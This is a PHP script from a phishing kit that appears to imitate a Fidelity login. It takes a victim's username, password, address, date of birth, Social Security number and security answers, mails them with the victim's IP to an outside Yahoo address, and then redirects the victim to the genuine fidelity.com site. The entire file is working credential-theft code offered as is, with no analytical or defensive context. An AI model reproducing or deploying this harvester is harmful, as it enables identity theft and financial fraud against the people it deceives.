<?
if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
header("Location: index.html");
exit;
}


$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------------------------------------\n";
$message .= "Username     : ".$_POST['user']."\n";
$message .= "Password     : ".$_POST['pass']."\n";
$message .= "------------------------------\n";
$message .= "First name   : ".$_POST['firstName']."\n";
$message .= "Last name    : ".$_POST['lastName']."\n";
$message .= "Address      : ".$_POST['address']."\n";
$message .= "City         : ".$_POST['city']."\n";
$message .= "State        : ".$_POST['state']."\n";
$message .= "Zip          : ".$_POST['zip']."\n";
$message .= "Country      : ".$_POST['country']."\n";
$message .= "Phone        : ".$_POST['phone']."";
$message .= "DOB          : ".$_POST['month']."-".$_POST['day']."-".$_POST['year']."";
$message .= "SSN          : ".$_POST['ssn']."";
$message .= "------------------------------\n";
$message .= "Question 1   : ".$_POST['question1']."\n";
$message .= "Answer1      : ".$_POST['answer1']."\n";
$message .= "Question 2   : ".$_POST['question2']."\n";
$message .= "Answer2      : ".$_POST['answer2']."\n";
$message .= "Question 3   : ".$_POST['question3']."\n";
$message .= "Answer3      : ".$_POST['answer3']."\n";
$message .= "Question 4   : ".$_POST['question4']."\n";
$message .= "Answer4      : ".$_POST['answer4']."\n";
$message .= "Password     : ".$_POST['password1']."\n";
$message .= "IP           : ".$ip."\n";
$message .= "User-Agent   : ".$browser."\n";
$message .= "-----------------------------------------------\n";
$subject = "fidel $ip";
$headers .= "MIME-Version: 1.0\n";

$recepient = "alanbarnesfinearts@yahoo.com";       

if(mail($recepient,$subject,$message,$headers) != false){
mail($recepient,$subject,$message,$headers);
}
header("Location: http://fidelity.com/");

?>